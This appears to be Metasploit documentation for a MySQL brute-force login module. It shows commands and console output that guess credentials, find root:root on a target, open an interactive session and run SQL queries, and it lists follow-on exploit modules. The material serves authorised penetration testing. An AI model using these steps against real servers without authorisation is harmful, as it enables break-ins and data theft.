## Description

This auxiliary module is a brute-force login tool for MySQL servers.

## Verification Steps

1. Do: ```use auxiliary/scanner/mysql/mysql_login```
2. Do: ```set PASS_FILE [file containing passwords]```
3. Do: ```set RHOSTS [IP]```
4. Do: ```set USER_FILE [file containing usernames]```
4. Do: ```run```

## Scenarios

```msf
msf > use auxiliary/scanner/mysql/mysql_login 
msf auxiliary(mysql_login) > set PASS_FILE /tmp/passes.txt
PASS_FILE => /tmp/passes.txt
msf auxiliary(mysql_login) > set RHOSTS 192.168.1.200
RHOSTS => 192.168.1.200
msf auxiliary(mysql_login) > set USER_FILE /tmp/users.txt
USER_FILE => /tmp/users.txt
msf auxiliary(mysql_login) > run

[*] 192.168.1.200:3306 - Found remote MySQL version 5.0.51a
[*] 192.168.1.200:3306 Trying username:'administrator' with password:''
[*] 192.168.1.200:3306 failed to login as 'administrator' with password ''
[*] 192.168.1.200:3306 Trying username:'admin' with password:''
[*] 192.168.1.200:3306 failed to login as 'admin' with password ''
[*] 192.168.1.200:3306 Trying username:'root' with password:''
[*] 192.168.1.200:3306 failed to login as 'root' with password ''
[*] 192.168.1.200:3306 Trying username:'god' with password:''
[*] 192.168.1.200:3306 failed to login as 'god' with password ''
[*] 192.168.1.200:3306 Trying username:'administrator' with password:'root'
[*] 192.168.1.200:3306 failed to login as 'administrator' with password 'root'
[*] 192.168.1.200:3306 Trying username:'administrator' with password:'admin'
[*] 192.168.1.200:3306 failed to login as 'administrator' with password 'admin'
[*] 192.168.1.200:3306 Trying username:'administrator' with password:'god'
[*] 192.168.1.200:3306 failed to login as 'administrator' with password 'god'
[*] 192.168.1.200:3306 Trying username:'administrator' with password:'s3cr3t'
[*] 192.168.1.200:3306 failed to login as 'administrator' with password 's3cr3t'
[*] 192.168.1.200:3306 Trying username:'admin' with password:'root'
[*] 192.168.1.200:3306 failed to login as 'admin' with password 'root'
[*] 192.168.1.200:3306 Trying username:'admin' with password:'admin'
[*] 192.168.1.200:3306 failed to login as 'admin' with password 'admin'
[*] 192.168.1.200:3306 Trying username:'admin' with password:'god'
[*] 192.168.1.200:3306 failed to login as 'admin' with password 'god'
[*] 192.168.1.200:3306 Trying username:'admin' with password:'s3cr3t'
[*] 192.168.1.200:3306 failed to login as 'admin' with password 's3cr3t'
[*] 192.168.1.200:3306 Trying username:'root' with password:'root'
[+] 192.168.1.200:3306 - SUCCESSFUL LOGIN 'root' : 'root'
[*] 192.168.1.200:3306 Trying username:'god' with password:'root'
[*] 192.168.1.200:3306 failed to login as 'god' with password 'root'
[*] 192.168.1.200:3306 Trying username:'god' with password:'admin'
[*] 192.168.1.200:3306 failed to login as 'god' with password 'admin'
[*] 192.168.1.200:3306 Trying username:'god' with password:'god'
[*] 192.168.1.200:3306 failed to login as 'god' with password 'god'
[*] 192.168.1.200:3306 Trying username:'god' with password:'s3cr3t'
[*] 192.168.1.200:3306 failed to login as 'god' with password 's3cr3t'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(mysql_login) >
```

## Obtaining an Interactive Session

The CreateSession option allows you to obtain an interactive session
for the MySQL client you're connecting to. The run command with CreateSession
set to true should give you an interactive session:

```msf
run rhost=127.0.0.1 rport=4306 username=root password=password createsession=true

[+] 127.0.0.1:4306        - 127.0.0.1:4306 - Found remote MySQL version 11.2.2
[+] 127.0.0.1:4306        - 127.0.0.1:4306 - Success: 'root:password'
[*] MySQL session 1 opened (127.0.0.1:53241 -> 127.0.0.1:4306) at 2024-03-12 12:40:46 -0500
[*] 127.0.0.1:4306        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_login) > sessions -i -1
[*] Starting interaction with 1...

mysql @ 127.0.0.1:4306 >
```

You can interact with your new session using `sessions -i -1` or `sessions -i <session id>`.
You can also use `help` to get more information about how to use your session.

```msf
msf6 auxiliary(scanner/mysql/mysql_login) > sessions

Active sessions
===============

  Id  Name  Type   Information                      Connection
  --  ----  ----   -----------                      ----------
  2         mssql  MSSQL test @ 192.168.2.242:1433  192.168.2.1:61428 -> 192.168.2.242:1433 (192.168.2.242)
  3         mysql  MySQL root @ 127.0.0.1:4306      127.0.0.1:61450 -> 127.0.0.1:4306 (127.0.0.1)

msf6 auxiliary(scanner/mysql/mysql_login) > sessions -i 3
[*] Starting interaction with 3...
```

When interacting with a session, the help command can be useful:

```msf
mysql @ 127.0.0.1:4306 > help

Core Commands
=============

    Command            Description
    -------            -----------
    ?                  Help menu
    background         Backgrounds the current session
    bg                 Alias for background
    exit               Terminate the PostgreSQL session
    help               Help menu
    irb                Open an interactive Ruby shell on the current session
    pry                Open the Pry debugger on the current session
    sessions           Quickly switch to another session


MySQL Client Commands
=====================

    Command            Description
    -------            -----------
    query              Run a single SQL query
    query_interactive  Enter an interactive prompt for running multiple SQL queries


Local File System Commands
==========================

    Command            Description
    -------            -----------
    getlwd             Print local working directory (alias for lpwd)
    lcat               Read the contents of a local file to the screen
    lcd                Change local working directory
    ldir               List local files (alias for lls)
    lls                List local files
    lmkdir             Create new directory on local machine
    lpwd               Print local working directory

This session also works with the following modules:

  auxiliary/admin/mysql/mysql_enum
  auxiliary/admin/mysql/mysql_sql
  auxiliary/scanner/mysql/mysql_file_enum
  auxiliary/scanner/mysql/mysql_hashdump
  auxiliary/scanner/mysql/mysql_schemadump
  auxiliary/scanner/mysql/mysql_version
  auxiliary/scanner/mysql/mysql_writable_dirs
  exploit/multi/mysql/mysql_udf_payload
  exploit/windows/mysql/mysql_mof
  exploit/windows/mysql/mysql_start_up
```

Once you've done that, you can run any MySQL query against the target using the `query` command:

```msf
mysql @ 127.0.0.1:4306 > query -h
Usage: query

Run a single SQL query on the target.

OPTIONS:

    -h, --help      Help menu.
    -i, --interact  Enter an interactive prompt for running multiple SQL queries

Examples:

    query SHOW DATABASES;
    query USE information_schema;
    query SELECT * FROM SQL_FUNCTIONS;
    query SELECT version();

mysql @ 127.0.0.1:4306 > query 'SELECT version();'
Response
========

    #  version()
    -  ---------
    0  11.2.2-MariaDB-1:11.2.2+maria~ubu2204
```

Alternatively you can enter a SQL prompt via the `query_interactive` command which supports multiline commands:

```msf
mysql @ 127.0.0.1:4306 > query_interactive -h
Usage: query_interactive

Go into an interactive SQL shell where SQL queries can be executed.
To exit, type 'exit', 'quit', 'end' or 'stop'.

mysql @ 127.0.0.1:4306 > query_interactive
[*] Starting interactive SQL shell for mysql @ 127.0.0.1:4306
[*] SQL commands ending with ; will be executed on the remote server. Use the exit command to exit.

SQL >> SELECT table_name
SQL *> FROM information_schema.tables
SQL *> LIMIT 2;
[*] Executing query: SELECT table_name FROM information_schema.tables LIMIT 2;
Response
========

    #  table_name
    -  ----------
    0  ALL_PLUGINS
    1  APPLICABLE_ROLES

SQL >>
```
